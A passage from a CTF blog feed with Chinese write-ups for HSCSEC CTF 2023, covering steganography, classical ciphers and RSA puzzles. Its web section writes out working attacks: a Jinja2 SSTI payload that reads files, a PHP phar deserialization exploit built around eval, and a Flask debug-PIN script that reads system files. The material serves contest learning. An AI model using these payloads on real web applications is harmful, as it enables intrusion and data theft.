class="number">16</span>)</span><br><span class="line">    z=(x - <span class="number">55296</span>) * <span class="number">1024</span> + y - <span class="number">56320</span> + <span class="number">65536</span> - <span class="number">128512</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> v:</span><br><span class="line">        num[z] -= t[<span class="number">0</span>]*t[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x00\x00\x00\x00\x00\x00369d9412-f5c8-4aa4-8056-a7e4369d4555\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;369d9412-f5c8-4aa4-8056-a7e4369d4555&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>无</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2023年春秋杯网络安全联赛春季赛，将更加深化人才培养的意义，给予新生代选手更大的舞台，本次比赛特将时长延长至7天，相对于以往的比赛，这是一次前所未有的尝试。同时，赛题难度分布更加合理均衡，题目质量依旧值得让人期待。题目设计涵盖了多个方面的安全技术</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSCSEC CTF 2023 (HSC-2th 2023)</title>
    <link href="https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/"/>
    <id>https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/</id>
    <published>2023-02-12T14:23:55.000Z</published>
    <updated>2023-02-12T16:47:31.210Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8</p><p>本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。前十名可获得合作伙伴赞助礼品以及实体证书。</p><p><strong>Rank: 1</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="SIGNIN"><a href="#SIGNIN" class="headerlink" title="SIGNIN"></a>SIGNIN</h3><blockquote><p>关注公众号：中龙 红客突击队 发送：HSCCTF{TELLMEFLAG}获取flag！</p></blockquote><p>公众号签到，<code>HSCSEC&#123;W3Ic0m3_t0_HScCtF2tH&#125;</code>。</p><p>​    </p><h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><blockquote><p>flag2为用户登录的密码<br>下载：<br>百度网盘：<a href="https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2">https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2</a><br>提取码：HSC2<br>腾讯网盘：<a href="https://share.weiyun.com/EyhLtHnF">https://share.weiyun.com/EyhLtHnF</a><br>密码：jyk6t9<br>奶牛快传： <a href="https://cowtransfer.com/s/d83e0de581aa49">https://cowtransfer.com/s/d83e0de581aa49</a> 点击链接查看 [ LINUX.rar ] ，或访问奶牛快传 cowtransfer.com 输入传输口令 xgzg82 查看；</p></blockquote><p>非预期，直接16进制查看文件，搜字符串 <code>HSCSEC&#123;</code> 发现：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# history</span><br><span class="line">    1  f1aG1:HSCSEC&#123;Lim3_</span><br><span class="line">    2  exit</span><br><span class="line">    3  ubuntu20.04</span><br><span class="line">    4  history</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;flag3:_iez&#125;&quot; &gt; /f1Ag3</span><br></pre></td></tr></table></figure><p>连接得flag：<code>HSCSEC&#123;Lim3_ubuntu20.04_iez&#125;</code>。</p><p>​    </p><h3 id="Salute"><a href="#Salute" class="headerlink" title="Salute"></a>Salute</h3><p>解压得到 <code>encode_salute</code> 文件，尾部有 <code>525d93ceb70e2bf5daa84ec3d0cd2c731a</code>，md5查询得明文 <code>qwer1234</code>，以此为密钥与文件异或，还原得到rar文件。</p><p>文件里一张jpg图片一张png图片，用stegsolve查看png图片alpha0通道，有 <code>flag2/key that_is</code> 字样。</p><p>再以此为密码，用steghide提取jpg图片的隐藏信息：<code>steghide extract -sf salute.jpg</code>，得到flag文件内容 <code>flag3:_c0ol&#125;</code>。</p><p>连接为flag：<code>HSCSEC&#123;qwer1234that_is_c0ol&#125;</code>。</p><p>​    </p><h3 id="EZIMG"><a href="#EZIMG" class="headerlink" title="EZIMG"></a>EZIMG</h3><p>png图片尾部有01串+反转的png，提取01串做二维码图，扫出内容 <code>flag2:aQR_c0de_and</code>；反转的png还原为新png图，反色处理得到 <code>HSCSEC&#123;p3G_h</code>。</p><p>少了第三部分，对新png图尝试使用<a href="http://tools.jb51.net/aideddesign/img_add_info">PixelJihad解密</a>，得到 <code>_3nc&#125;</code>。</p><p>连接为flag：<code>HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;</code>。</p><p>​    </p><h2 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h2><h3 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h3><blockquote><p>☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲</p></blockquote><p>猜测为八卦+空一一对应9个数字，根据 <code>HSCSEC&#123;&#125;</code> 对应的九进制数，可知7个符号对应的数，剩下的2个测试即可。</p><p>最终对应 <code>80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148</code></p><p>转换为十进制：<code>72 83 67 83 69 67 123 67 104 105 110 101 115 101 95 103 48 115 115 112 125</code></p><p>转换为字符串：<code>HSCSEC&#123;Chinese_g0ssp&#125;</code>，还得手动补全单词才正确……</p><p>flag：<code>HSCSEC&#123;Chinese_g0ssip&#125;</code>。</p><p>​    </p><h3 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h3><blockquote><p>斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴<br>虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐<br>壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马<br>虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓<br>室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐<br>牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌<br>危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐<br>斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡<br>危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴<br>牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎<br>室火猪鬼金羊柳土獐壁水貐</p></blockquote><p>查到每三个字组成的词为28星宿里的一种，且根据方位分别归类到青龙、白虎、朱雀、玄武四大类中：</p><p>青龙：角木蛟、亢金龙、氐土貉、房日兔、心月狐、尾火虎、箕水豹<br>玄武：斗木獬、牛金牛、女土蝠、虚日鼠、危月燕、室火猪、壁水貐<br>白虎：奎木狼、娄金狗、胃土雉、昴日鸡、毕月乌、觜火猴、参水猿<br>朱雀：井木犴、鬼金羊、柳土獐、星日马、张月鹿、翼火蛇、轸水蚓</p><p>按4进制分别替换为0-3，得到 <code>1020 1103 1003 1103 1011 1003 1323 1003 1032 1133 1001 1232 1203 1221 1211 1232 1310 1133 1001 1100 1331</code>。</p><p>转换为十进制：<code>72 83 67 83 69 67 123 67 78 95 65 110 99 105 101 110 116 95 65 80 125</code></p><p>转换为字符串：<code>HSCSEC&#123;CN_Ancient_AP&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> m</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = m * e * <span class="number">1</span> * <span class="number">2022</span> * p</span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line"><span class="comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = M^e \bmod n = (2022mep)^e \bmod n$，令 $c’ = c \cdot (2022e)^{-e} \bmod n = (mp)^e \bmod n = (m^ep^{e-1} \bmod n) \cdot p$，</p><p>故 $\gcd(c’,n)=p$，再利用常规RSA求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">cc = c * inverse_mod(<span class="built_in">pow</span>(<span class="number">2022</span>*e,e,n),n)</span><br><span class="line">p = gcd(cc,n)</span><br><span class="line">q = n // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(cc,d,n) // p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;*******************MASK****************&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(FLAG)</span></span><br><span class="line">number1 = getPrime(<span class="number">512</span>)</span><br><span class="line">number2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(number1)</span><br><span class="line">result = FLAG * number1 % number2</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$m$ 与 $n_1$ （512位）乘积的大小不会超过 $n_2$ 大小（1024位），故 $c=mn_1$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">c = <span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c//n1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;qMmZqWvmj70bBsCfmVLT&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;HSCSEC&#123;&#x27;</span>)</span><br><span class="line">flag_num_list = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">    flag_num_list.append(alphabet.find(item) + <span class="number">1</span>)</span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_num_list:</span><br><span class="line">    m = (i + key_num) % <span class="number">94</span> - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">        c.append(<span class="string">&quot;□&quot;</span>)</span><br><span class="line">    c.append(alphabet[m-<span class="number">1</span>:m])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#x27;</span>.join(c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br></pre></td></tr></table></figure></blockquote><p>代码里面的 <code>key_num</code> 其实固定为0，实际当1，模运算也没啥用，实际是rot1凯撒加密，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">flag = [alphabet[alphabet.index(k)+<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h3><p>基本没过滤的SSTI，尝试</p><p> <code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flag").read()&#125;&#125;</code></p><p>报错无法打开 <code>/</code> ，说明 <code>flag</code> 被替换为空，双写绕过即可：</p><p><code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flflagag").read()&#125;&#125;</code></p><p>​    </p><h3 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h3><p>查看首页源码，发现upload和view两个对话框包括关键字段 <code>name=&quot;acti0n&quot;</code>，抓包看到 <code>?acti0n=upload</code> 的访问方式，为文件包含漏洞点。</p><p>通过设置 <code>acti0n</code> 参数和filter过滤器访问，得到 <code>upload.php</code> 和 <code>view.php</code> 源码。审计代码，<code>upload.php</code> 中包含上传文件与拦截过滤危险函数的功能，<code>view.php</code> 中有 <code>eval()</code> 函数，只需要修改类中的私有变量 <code>$cmd</code> 就可以拿到shell。</p><p>其中 <code>file_exists()</code> 函数结合文件上传可以想到phar反序列化漏洞利用。结合 <code>upload.php</code> 中关键字黑名单，使用 <code>show_source()</code> 函数读取 <code>flag.php</code> 文件。</p><p>构造phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地运行生成 <code>phar.phar</code>，然后直接上传。文件上传成功之后，通过 <code>delete</code> 这个参数来触发 <code>file_exists()</code> 才可以利用phar，POST参数 <code>delete=phar://phar.phar</code> 即可拿到flag。</p><p>​    </p><h3 id="EZSYFLASK"><a href="#EZSYFLASK" class="headerlink" title="EZSYFLASK"></a>EZSYFLASK</h3><p>有一个可以文件包含的路由：<code>GET /view?filename=app.py</code>，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;GET /view?filename=app.py&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewFile</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;cgroup&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;self&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;文件存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;</span></span><br><span class="line"><span class="string">            &#123;&#125;</span></span><br><span class="line"><span class="string">            &lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;文件不存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;</span></span><br><span class="line"><span class="string">        文件不存在</span></span><br><span class="line"><span class="string">        &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>去除参数可以触发debug报错页，计算PIN值可以进入调试模式。由于禁用了 <code>flag/self/cgroup</code>，<code>/proc/self/cgroup</code> 获取不到，可以利用 <code>/proc/1/mountinfo</code> 获取docker-id：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &gt;=3.8 sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span 